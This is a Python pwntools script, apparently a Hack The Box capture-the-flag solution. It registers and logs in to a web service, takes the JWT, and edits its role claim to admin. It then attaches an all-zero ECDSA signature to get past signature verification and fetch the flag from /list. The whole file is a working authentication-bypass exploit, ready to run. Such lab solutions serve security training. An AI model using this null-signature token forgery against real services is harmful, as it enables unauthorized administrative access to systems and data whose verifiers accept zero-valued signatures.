#!/usr/bin/env python3
from pwn import remote
import re
import base64

HOST = '83.136.249.246'
PORT = 44472
USERNAME = 'htb_user'
PASSWORD = 'htb_user'
EMAIL    = 'user@htb.eu'


def send_http_request(conn, method, path, headers=None, body=''):
    """
    Send a raw HTTP request over a pwntools connection.
    """
    if headers is None:
        headers = {}
    # Build request line
    req = f"{method} {path} HTTP/1.1\r\n"
    # Default Host header
    headers['Host'] = f"{HOST}:{PORT}"
    # Add Content-Length if body exists
    if body:
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        headers['Content-Length'] = str(len(body))

    # Append headers
    for k, v in headers.items():
        req += f"{k}: {v}\r\n"
    # End headers and add body
    req += "\r\n" + body

    conn.send(req.encode())
    # Receive until end of headers
    response = conn.recvuntil(b"\r\n\r\n")
    # If there's a body, grab it too (briefly)
    try:
        response += conn.recv(timeout=1)
    except EOFError:
        pass
    return response


def register_user():
    """Register a new user on the target."""
    conn = remote(HOST, PORT)
    data = f"username={USERNAME}&password={PASSWORD}&email={EMAIL}"
    resp = send_http_request(conn, 'POST', '/register', body=data)
    print("[+] Registered user (status):", resp.split(b' ')[1])
    conn.close()


def login_and_get_jwt():
    """Login and extract the JWT token from Set-Cookie."""
    conn = remote(HOST, PORT)
    data = f"username={USERNAME}&password={PASSWORD}"
    resp = send_http_request(conn, 'POST', '/login', body=data)
    # Parse Set-Cookie header
    m = re.search(rb'Set-Cookie: token=([^;]+);', resp)
    if not m:
        print("[-] Failed to obtain JWT token")
        exit(1)
    token = m.group(1).decode()
    print("[+] Obtained JWT:", token)
    conn.close()
    return token


def craft_admin_token(jwt):
    """Modify the payload role to 'admin' and nullify the signature (r=s=0 DER)."""
    hdr, payload, sig = jwt.split('.')
    # Decode payload (URL-safe base64 with padding)
    data = base64.urlsafe_b64decode(payload + '==')
    # Replace role 'user' with 'admin'
    data = data.replace(b'user', b'admin')
    # Re-encode without padding
    new_payload = base64.urlsafe_b64encode(data).decode().rstrip('=')
    # Build new token with DER-null signature
    admin_jwt = f"{hdr}.{new_payload}.MAYCAQACAQA"
    print("[+] Crafted admin JWT:", admin_jwt)
    return admin_jwt


def fetch_flag(admin_token):
    """Use the crafted admin JWT to fetch the flag from /list."""
    conn = remote(HOST, PORT)
    headers = {'Cookie': f'token={admin_token}'}
    resp = send_http_request(conn, 'GET', '/list', headers=headers)
    # Extract the HTB flag pattern
    m = re.search(rb'HTB\{.*?\}', resp)
    if m:
        print("[+] Flag found:", m.group(0).decode())
    else:
        print("[-] Flag not found, response was:\n", resp.decode())
    conn.close()


if __name__ == '__main__':
    register_user()
    jwt = login_and_get_jwt()
    admin_jwt = craft_admin_token(jwt)
    fetch_flag(admin_jwt)
